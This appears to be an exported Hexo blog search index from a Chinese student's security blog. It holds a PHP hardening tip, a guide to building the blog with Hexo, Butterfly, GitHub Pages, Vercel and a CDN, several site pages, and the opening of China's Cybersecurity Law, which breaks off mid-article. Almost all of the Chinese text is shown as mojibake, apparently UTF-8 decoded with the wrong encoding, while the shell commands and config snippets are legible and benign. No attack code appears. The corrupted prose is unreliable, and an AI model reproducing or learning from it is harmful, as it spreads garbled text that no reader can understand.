·å¯ä»¥æœ‰æ•ˆé˜²æ­¢å¤§è§„æ¨¡çš„ DOS æ”»å‡»ã€‚</p><p><strong>ç¦ç”¨æœªä½¿ç”¨çš„ PHP æ¨¡å—</strong></p><p>æŸ¥çœ‹å·²å®‰è£…çš„ PHP æ¨¡å—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -m</span><br></pre></td></tr></table></figure><p>æ ¹æ®å®é™…æƒ…å†µï¼Œç¦ç”¨ä¸ä½¿ç”¨æ¨¡å—ï¼Œæ³¨é‡Šæ‰ <code>php.ini</code>ç›¸åº”çš„é…ç½®è¡Œå³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ªäººåšå®¢æ­å»ºè®°å½•</title>
      <link href="posts/50074.html"/>
      <url>posts/50074.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åšå®¢ç»è¿‡å‡ ä»£æ›´è¿­ï¼Œç°åœ¨ç¡®å®šä¸‹æ¥ï¼Œä¸å†æ›´æ”¹äº†ï¼Œé™å¿ƒå­¦ä¹ ï¼Œå¥½å¥½å†™åšå®¢æ‰æ˜¯æ­£é“ã€‚</p><p>æ­¤åšå®¢ç”± <a href="https://hexo.io/zh-cn/">Hexo</a> æ¡†æ¶æ­å»ºï¼Œä½¿ç”¨ <a href="https://butterfly.js.org/">Butterfly</a> ä¸»é¢˜ï¼Œæ‰˜ç®¡äº <a href="https://github.com/">Github</a> å’Œ <a href="https://vercel.com/">Vercel</a> ï¼Œ<a href="https://www.upyun.com/">åˆæ‹äº‘</a>æä¾›CDNåŠ é€Ÿå’Œå¯¹è±¡å­˜å‚¨æœåŠ¡ã€‚</p><h1 id="å®‰è£…Hexoæ¡†æ¶"><a href="#å®‰è£…Hexoæ¡†æ¶" class="headerlink" title="å®‰è£…Hexoæ¡†æ¶"></a>å®‰è£…Hexoæ¡†æ¶</h1><p>Hexo æ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„åšå®¢æ¡†æ¶ã€‚</p><p>å®‰è£… Hexo ç›¸å½“ç®€å•ï¼Œåªéœ€è¦å…ˆå®‰è£…ä¸‹åˆ—åº”ç”¨ç¨‹åºå³å¯ï¼š</p><ul><li><a href="http://nodejs.org/">Node.js</a> </li><li><a href="http://git-scm.com/">Git</a></li></ul><p>è¿™ä¸¤ä¸ªå¿…å¤‡çš„åº”ç”¨ç¨‹åºå®‰è£…å®Œæˆåï¼Œå³å¯ä½¿ç”¨ npm å®‰è£… Hexoã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>å®‰è£… Hexo å®Œæˆåï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾åšå®¢ç›¸å…³æ–‡ä»¶ã€‚æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼ŒHexo å°†ä¼šåœ¨æŒ‡å®šæ–‡ä»¶å¤¹ä¸­æ–°å»ºæ‰€éœ€è¦çš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure><p>å®Œæˆåæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆé™æ€é¡µé¢ï¼Œè®¿é—® <code>localhost:4000</code> å¯è¿›è¡Œé¢„è§ˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><p><img src="https://cdn.wawyw.top/images/1-hexo.png" alt="1-hexo"></p><h1 id="ä½¿ç”¨Bufferflyä¸»é¢˜"><a href="#ä½¿ç”¨Bufferflyä¸»é¢˜" class="headerlink" title="ä½¿ç”¨Bufferflyä¸»é¢˜"></a>ä½¿ç”¨Bufferflyä¸»é¢˜</h1><p>åœ¨<a href="https://hexo.io/themes/">Heoxå®˜ç½‘çš„ä¸»é¢˜é¡µé¢</a>é€‰æ‹©ä¸€ä¸ªæ»¡æ„çš„ä¸»é¢˜ã€‚æˆ‘é€‰æ‹©äº†Butterflyä¸»é¢˜ï¼Œç„¶åæ ¹æ®æ–‡æ¡£è¯´æ˜ç›´æ¥é…ç½®ä¸»é¢˜å³å¯ã€‚</p><p>å®‰è£…ä¸»é¢˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><p>åº”ç”¨ä¸»é¢˜ï¼Œä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶<code>_config.yml</code>ï¼ŒæŠŠä¸»é¢˜é€‰æ‹©æ”¹ä¸º<code>butterfly</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>å®‰è£…ç›¸å…³æ’ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>åœ¨ä¸€å®šä¿®æ”¹åé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹åº”ç”¨ä¸»é¢˜åçš„æ•ˆæœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #æ¸…ç†ç¼“å­˜æ–‡ä»¶</span><br><span class="line">hexo g  #ç”Ÿæˆé™æ€é¡µé¢</span><br><span class="line">hexo s  #é‡å¯æœ¬åœ°æœåŠ¡å™¨</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>localhost:4000</code> ï¼Œå¯ä»¥çœ‹åˆ°æ›´æ–°åçš„ä¸»é¢˜é¡µé¢ã€‚</p><p><img src="https://cdn.wawyw.top/images/1-bufferfly.png" alt="1-bufferfly"></p><p>æ›´å¤šçš„ä¸»é¢˜ç¾åŒ–æ“ä½œï¼Œå¯ä»¥å‚è€ƒä¸»é¢˜æ–‡æ¡£æ¥é…ç½®ã€‚</p><h1 id="éƒ¨ç½²åˆ°Github"><a href="#éƒ¨ç½²åˆ°Github" class="headerlink" title="éƒ¨ç½²åˆ°Github"></a>éƒ¨ç½²åˆ°Github</h1><ol><li><p>æ–°å»ºä»“åº“ï¼Œå°†ä»“åº“åè®¾ç½®ä¸º <code>username.github.io</code>  <strong>(usernameå¯¹åº”githubç”¨æˆ·å)</strong></p><p>æ¥ä¸‹æ¥ä½¿ç”¨gitæŠŠæœ¬åœ°çš„åšå®¢æ–‡ä»¶ä¸Šä¼ åˆ°githubä»“åº“ã€‚å¦‚æœç¬¬ä¸€æ¬¡ä½¿ç”¨gitçš„è¯ï¼Œéœ€è¦ç»‘å®šç”¨æˆ·åå’Œé‚®ç®±ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your username&quot;</span><br><span class="line">git config --global user.email &quot;your email&quot;</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°çš„â€œyour usernameâ€æ¢æˆgithubç”¨æˆ·å,â€your emailâ€æ¢æˆæ³¨å†Œgithubçš„é‚®ç®±åœ°å€ã€‚</p><p>ç„¶åï¼Œç”Ÿæˆå…¬é’¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>åœ¨Cç›˜/ç”¨æˆ·/ç”¨æˆ·å/.sshç›®å½•ä¸‹æ‰¾åˆ°<code>id_rsa.pub</code>æ–‡ä»¶,ç”¨æ–‡æœ¬ç¼–è¾‘å·¥å…·æ‰“å¼€ï¼Œå¹¶å¤åˆ¶æ‰€æœ‰æ–‡æœ¬å†…å®¹ã€‚</p><p>åœ¨Githubé¡µé¢å³ä¸Šè§’ï¼Œç‚¹å‡»ç”¨æˆ·å¤´åƒ-Settings-SSH and GPG keys-New SSH key</p><p>æŠŠå¤åˆ¶çš„å…¬é’¥æ–‡æœ¬å†…å®¹ç²˜è´´åˆ°Keyä¸­ï¼Œä¸Šæ–¹çš„Titleå¯éšæ„å¡«å†™</p><p>æ·»åŠ å®Œæˆåæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>å¦‚æœé…ç½®æˆåŠŸï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸçš„å›å¤ã€‚</p></li><li><p>åœ¨ä¸Šä¼ ä¹‹å‰ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶<code>_config.yml</code>ä¸­æ·»åŠ ä»“åº“ä¿¡æ¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="comment">#ä½ çš„ä»“åº“åœ°å€,å¦‚:https://github.com/wawyw/wawyw.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></li><li><p>ç›´æ¥é€šè¿‡hexoéƒ¨ç½²åˆ°githubï¼Œéœ€è¦å®‰è£…ä»¥ä¸‹æ’ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…æˆåŠŸåï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure></li><li><p>åˆ·æ–°githubå¯¹åº”çš„repositoryé¡µé¢ï¼Œå³å¯çœ‹åˆ°æäº¤çš„åšå®¢æ–‡ä»¶ã€‚</p></li><li><p>æ¥ä¸‹æ¥é…ç½®é™æ€ç«™ç‚¹ã€‚</p></li></ol><p>ç‚¹å‡»Settings, è¿›å…¥GitHub Pagesé…ç½®ï¼Œç”±äºä¹‹å‰æ–°å»ºä»“åº“çš„æ—¶å€™ï¼Œä»“åº“åä¸ºusername.github.ioï¼Œgithubå·²ç»è‡ªå·±ä¸ºæˆ‘ä»¬å‘å¸ƒäº†é™æ€çš„é¡µé¢ã€‚å¦‚æœä¸æ˜¯username.github.ioçš„æ ¼å¼ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚</p><p>ä¹‹åè®¿é—®<code>username.github.io</code>å¯åœ¨çº¿çœ‹åˆ°åšå®¢ç«™ç‚¹ã€‚</p><p>æ›´æ¢åŸŸååªè¦æŠŠä¸ªäººåŸŸåè§£æåˆ°<code>username.github.io</code>ã€‚</p><h1 id="éƒ¨ç½²åˆ°Vercel"><a href="#éƒ¨ç½²åˆ°Vercel" class="headerlink" title="éƒ¨ç½²åˆ°Vercel"></a>éƒ¨ç½²åˆ°Vercel</h1><blockquote><p><a href="https://vercel.com/">vercel</a>ç±»ä¼¼äºgithub pageï¼Œä½†è¿œæ¯”github pageå¼ºå¤§ï¼Œé€Ÿåº¦ä¹Ÿå¿«å¾—å¤šå¾—å¤šï¼Œè€Œä¸”å°†Githubæˆæƒç»™vercelåï¼Œå¯ä»¥è¾¾åˆ°æœ€ä¼˜é›…çš„å‘å¸ƒä½“éªŒï¼Œåªéœ€å°†ä»£ç è½»è½»ä¸€æ¨ï¼Œé¡¹ç›®å°±è‡ªåŠ¨æ›´æ–°éƒ¨ç½²äº†ã€‚</p></blockquote><ol><li>ä½¿ç”¨githubè´¦å·ç™»é™†åˆ°vercel</li><li>åœ¨vercelçš„Overviewèœå•ä¸‹ï¼Œç‚¹å‡»æŒ‰é’® New Project</li><li>åœ¨Import Git Repositoryé€‰é¡¹ä¸‹ï¼Œé€‰æ‹©å«åšå®¢æ–‡ä»¶çš„é‚£ä¸ªä»“åº“ï¼ŒImport</li><li>ç»§ç»­ï¼Œç‚¹å‡»DeployæŒ‰é’®ï¼Œvercelå°±å¼€å§‹æ„å»ºäº†</li><li>æ„å»ºå®Œä¹‹åï¼Œå¯ä»¥åœ¨Overviewèœå•ä¸‹ï¼Œçœ‹åˆ°æ–°å»ºçš„é¡¹ç›®,è‡³æ­¤é¡¹ç›®å·²ç»åˆ›å»ºå®Œæˆï¼Œå¯ä»¥é€šè¿‡vercelè‡ªåŠ¨é…ç½®çš„åŸŸåè®¿é—®äº†</li></ol><p>è®¾ç½®è‡ªå®šä¹‰åŸŸåï¼š</p><ul><li>ç‚¹å‡»Settings-&gt;Domainsï¼Œå¹¶åœ¨è¾“å…¥æ¡†ä¸­å¡«å…¥æƒ³è®¾ç½®çš„åŸŸåï¼Œç‚¹å‡»AddæŒ‰é’®</li><li>åˆ°åŸŸåæ§åˆ¶å°æ·»åŠ å¯¹åº”çš„è§£æè®°å½•</li><li>æ·»åŠ å®Œä¹‹åï¼Œå˜æˆå¦‚å›¾çš„æ ·å­åˆ™è§£ææ­£ç¡®</li></ul><p><img src="https://cdn.wawyw.top/images/1-vercel.png" alt="1-vercel"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡æˆ‘ä»¬è®¾ç½®çš„åŸŸåè®¿é—®æˆ‘ä»¬çš„åšå®¢ç½‘ç«™äº†ï¼</p><p>åé¢éœ€è¦æ›´æ–°ç½‘ç«™ï¼Œåªéœ€è¦å¾€githubä¸Šæäº¤æ–°çš„commitï¼Œvercelå°±ä¼šè‡ªåŠ¨é‡æ–°æ„å»ºäº†ï¼</p><h1 id="ä½¿ç”¨åˆæ‹äº‘CDN"><a href="#ä½¿ç”¨åˆæ‹äº‘CDN" class="headerlink" title="ä½¿ç”¨åˆæ‹äº‘CDN"></a>ä½¿ç”¨åˆæ‹äº‘CDN</h1><p>åˆ°CDNæœåŠ¡ç®¡ç†å¤„ï¼Œåˆ›å»ºæœåŠ¡ï¼Œå¦‚ä¸‹è®¾ç½®</p><p><img src="https://cdn.wawyw.top/images/1-upyun.png" alt="1-upyun"></p><p>æ·»åŠ CNAMEè®°å½•</p><p><img src="https://cdn.wawyw.top/images/1-upyun1.png"></p><p>è‹¥PingåŸŸåï¼Œåç¼€æ˜¾ç¤ºä¸º aicdn.comï¼Œåˆ™è¯æ˜CNAMEé…ç½®ç”Ÿæ•ˆï¼ŒåŠ é€ŸæœåŠ¡å·²å¯ç”¨ã€‚</p><p><img src="https://cdn.wawyw.top/images/1-upyun2.png"></p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="manifest.json"/>
      <url>manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº</title>
      <link href="about/index.html"/>
      <url>about/index.html</url>
      
        <content type="html"><![CDATA[<div class='tip success'><p>æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢ï¼Œè¿™æ˜¯ä¸€ä¸ªè®°å½•å­¦ä¹ çš„åœ°æ–¹ï¼Œåƒæˆ‘è¿™æ ·çš„åºŸç‰©éœ€è¦å¤šè®°âœ<p></div><div class='tip info'><p>å°ç«™çš„å¤§éƒ¨åˆ†ç¾åŒ–ã€é­”æ”¹æ¥è‡ªï¼ˆç™½å«–ï¼‰äºå¤§ä½¬ä»¬çš„åšå®¢ï¼Œæ„Ÿè°¢åˆ†äº«ï¼ğŸ¨<p></div><div class='tip warning'><p>åšå®¢ä¸­çš„éƒ¨åˆ†æ–‡å­—ã€å›¾ç‰‡æ¥æºäºç½‘ç»œï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»åˆ é™¤ã€‚ğŸš«<p></div><div class="tip ffa font5 fas fa-cogs"><p><del>æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿï¼</del>å¶å°”æ¬ç –ï¼Œæ—¥å¸¸æ‘¸é±¼ing...ğŸŸ</p><p></p></div><h1>ä¸ªäººç®€ä»‹</h1><div class="checkbox cyan">  <input type="radio" />    <p><del>å¤§ä¸€</del>å¤§äºŒstudentï¼Œåæ ‡ğŸŒé™•è¥¿è¥¿å®‰</p></div><div class="checkbox blue">  <input type="radio" />  <p>åŠªåŠ›å­¦ä¹ ç½‘ç»œå®‰å…¨çš„å°ç™½</p></div><div class="checkbox yellow">  <input type="radio" />  <p>Mailï¼šMjE5NzMzMTU0MEBxcS5jb20=</p></div><h1>2022ã®flag</h1><div class="checkbox green checked">  <input type="checkbox" checked />  <p>æŒ‰æ—¶ç¡è§‰ï¼Œè§„å¾‹ä½œæ¯</p></div><div class="checkbox blue checked">  <input type="checkbox" checked />  <p>åšæŒé”»ç‚¼ï¼Œé™å¿ƒå­¦ä¹ </p></div><div class="checkbox yellow checked">  <input type="checkbox" checked />  <p>â†’ctfã€â†’hvvã€â†’å®ä¹ </p></div><div class="checkbox red checked">  <input type="checkbox" checked />  <p>ä¸åšç§¯æåºŸäºº</p></div><div class="checkbox cyan checked">  <input type="checkbox" checked />  <p>åšæ¯”æ˜¨å¤©æ›´å¥½çš„è‡ªå·±</p></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>æœ‹å‹åœˆ</title>
      <link href="fcircle/index.html"/>
      <url>fcircle/index.html</url>
      
        <content type="html"><![CDATA[<div id="moments_container" ></div><script src="moments.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ†ç±»</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ‘‰Do you want to know?ğŸ‘ˆ</title>
      <link href="secret/index.html"/>
      <url>secret/index.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹.">  <script id="hbeData" type="hbeData" data-hmacdigest="0847dfe03054acd116027e1ec127cfeb5cc7594e767f81e2e0bb1d8f30df41e8">e72224b5b91b43f86582a683301246bbb1a6ebf43171e06271fc23f7920c5989e78877de5d9b3e70adc34885242b985a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>å‹é“¾</title>
      <link href="link/index.html"/>
      <url>link/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="æˆ‘çš„Blogä¿¡æ¯"><a href="#æˆ‘çš„Blogä¿¡æ¯" class="headerlink" title="æˆ‘çš„Blogä¿¡æ¯"></a>æˆ‘çš„Blogä¿¡æ¯</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">wawyw</span></span><br><span class="line">  <span class="attr">link:</span> <span class="string">https://www.wawyw.top/</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">https://www.wawyw.top/avatar.webp</span></span><br><span class="line">  <span class="attr">descr:</span> <span class="string">æ´»åœ¨å½“ä¸‹</span> <span class="string">é¡ºåŠ¿è€Œä¸º</span></span><br></pre></td></tr></table></figure><div class='tip info'><p>æ¬¢è¿äº¤æ¢å‹é“¾ğŸš€<p></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>ç¢ç¢å¿µ</title>
      <link href="speak/index.html"/>
      <url>speak/index.html</url>
      
        <content type="html"><![CDATA[<p>â€‹<br>â€‹<br>â€‹<br>â€‹        </p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>æ³•å¾‹æ³•è§„</title>
      <link href="law/index.html"/>
      <url>law/index.html</url>
      
        <content type="html"><![CDATA[<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">ç½‘ç»œå®‰å…¨æ³•</button></li><li class="tab"><button type="button" data-href="#-2">æ•°æ®å®‰å…¨æ³•</button></li><li class="tab"><button type="button" data-href="#-3">ä¸ªäººä¿¡æ¯ä¿æŠ¤æ³•</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><div id="BodyLabel"><div style="text-align: center;"></div><p style="TEXT-ALIGN: center" align="center"><font><strong>ä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•</strong></font></p><p style="TEXT-ALIGN: center" align="center"><font><strong>ï¼ˆ2016å¹´11æœˆ7æ—¥ç¬¬åäºŒå±Šå…¨å›½äººæ°‘ä»£è¡¨å¤§ä¼šå¸¸åŠ¡å§”å‘˜ä¼šç¬¬äºŒåå››æ¬¡ä¼šè®®é€šè¿‡ï¼‰</strong></font></p><p><font>ã€€ã€€ç›®ã€€å½•</font></p><p><font>ã€€ã€€ç¬¬ä¸€ç« ã€€æ€»ã€€åˆ™</font></p><p><font>ã€€ã€€ç¬¬äºŒç« ã€€ç½‘ç»œå®‰å…¨æ”¯æŒä¸ä¿ƒè¿›</font></p><p><font>ã€€ã€€ç¬¬ä¸‰ç« ã€€ç½‘ç»œè¿è¡Œå®‰å…¨</font></p><p><font>ã€€ã€€ç¬¬ä¸€èŠ‚ã€€ä¸€èˆ¬è§„å®š</font></p><p><font>ã€€ã€€ç¬¬äºŒèŠ‚ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¡Œå®‰å…¨</font></p><p><font>ã€€ã€€ç¬¬å››ç« ã€€ç½‘ç»œä¿¡æ¯å®‰å…¨</font></p><p><font>ã€€ã€€ç¬¬äº”ç« ã€€ç›‘æµ‹é¢„è­¦ä¸åº”æ€¥å¤„ç½®</font></p><p><font>ã€€ã€€ç¬¬å…­ç« ã€€æ³•å¾‹è´£ä»»</font></p><p><font>ã€€ã€€ç¬¬ä¸ƒç« ã€€é™„ã€€åˆ™</font></p><p><strong>ã€€ã€€ç¬¬ä¸€ç« ã€€æ€»ã€€åˆ™</strong></p><p>ã€€ã€€ç¬¬ä¸€æ¡ã€€ä¸ºäº†ä¿éšœç½‘ç»œå®‰å…¨ï¼Œç»´æŠ¤ç½‘ç»œç©ºé—´ä¸»æƒå’Œå›½å®¶å®‰å…¨ã€ç¤¾ä¼šå…¬å…±åˆ©ç›Šï¼Œä¿æŠ¤å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡çš„åˆæ³•æƒç›Šï¼Œä¿ƒè¿›ç»æµç¤¾ä¼šä¿¡æ¯åŒ–å¥åº·å‘å±•ï¼Œåˆ¶å®šæœ¬æ³•ã€‚</p><p>ã€€ã€€ç¬¬äºŒæ¡ã€€åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å»ºè®¾ã€è¿è¥ã€ç»´æŠ¤å’Œä½¿ç”¨ç½‘ç»œï¼Œä»¥åŠç½‘ç»œå®‰å…¨çš„ç›‘ç£ç®¡ç†ï¼Œé€‚ç”¨æœ¬æ³•ã€‚</p><p>ã€€ã€€ç¬¬ä¸‰æ¡ã€€å›½å®¶åšæŒç½‘ç»œå®‰å…¨ä¸ä¿¡æ¯åŒ–å‘å±•å¹¶é‡ï¼Œéµå¾ªç§¯æåˆ©ç”¨ã€ç§‘å­¦å‘å±•ã€ä¾æ³•ç®¡ç†ã€ç¡®ä¿å®‰å…¨çš„æ–¹é’ˆï¼Œæ¨è¿›ç½‘ç»œåŸºç¡€è®¾æ–½å»ºè®¾å’Œäº’è”äº’é€šï¼Œé¼“åŠ±ç½‘ç»œæŠ€æœ¯åˆ›æ–°å’Œåº”ç”¨ï¼Œæ”¯æŒåŸ¹å…»ç½‘ç»œå®‰å…¨äººæ‰ï¼Œå»ºç«‹å¥å…¨ç½‘ç»œå®‰å…¨ä¿éšœä½“ç³»ï¼Œæé«˜ç½‘ç»œå®‰å…¨ä¿æŠ¤èƒ½åŠ›ã€‚</p><p>ã€€ã€€ç¬¬å››æ¡ã€€å›½å®¶åˆ¶å®šå¹¶ä¸æ–­å®Œå–„ç½‘ç»œå®‰å…¨æˆ˜ç•¥ï¼Œæ˜ç¡®ä¿éšœç½‘ç»œå®‰å…¨çš„åŸºæœ¬è¦æ±‚å’Œä¸»è¦ç›®æ ‡ï¼Œæå‡ºé‡ç‚¹é¢†åŸŸçš„ç½‘ç»œå®‰å…¨æ”¿ç­–ã€å·¥ä½œä»»åŠ¡å’Œæªæ–½ã€‚</p><p>ã€€ã€€ç¬¬äº”æ¡ã€€å›½å®¶é‡‡å–æªæ–½ï¼Œç›‘æµ‹ã€é˜²å¾¡ã€å¤„ç½®æ¥æºäºä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å¤–çš„ç½‘ç»œå®‰å…¨é£é™©å’Œå¨èƒï¼Œä¿æŠ¤å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å…å—æ”»å‡»ã€ä¾µå…¥ã€å¹²æ‰°å’Œç ´åï¼Œä¾æ³•æƒ©æ²»ç½‘ç»œè¿æ³•çŠ¯ç½ªæ´»åŠ¨ï¼Œç»´æŠ¤ç½‘ç»œç©ºé—´å®‰å…¨å’Œç§©åºã€‚</p><p>ã€€ã€€ç¬¬å…­æ¡ã€€å›½å®¶å€¡å¯¼è¯šå®å®ˆä¿¡ã€å¥åº·æ–‡æ˜çš„ç½‘ç»œè¡Œä¸ºï¼Œæ¨åŠ¨ä¼ æ’­ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼Œé‡‡å–æªæ–½æé«˜å…¨ç¤¾ä¼šçš„ç½‘ç»œå®‰å…¨æ„è¯†å’Œæ°´å¹³ï¼Œå½¢æˆå…¨ç¤¾ä¼šå…±åŒå‚ä¸ä¿ƒè¿›ç½‘ç»œå®‰å…¨çš„è‰¯å¥½ç¯å¢ƒã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒæ¡ã€€å›½å®¶ç§¯æå¼€å±•ç½‘ç»œç©ºé—´æ²»ç†ã€ç½‘ç»œæŠ€æœ¯ç ”å‘å’Œæ 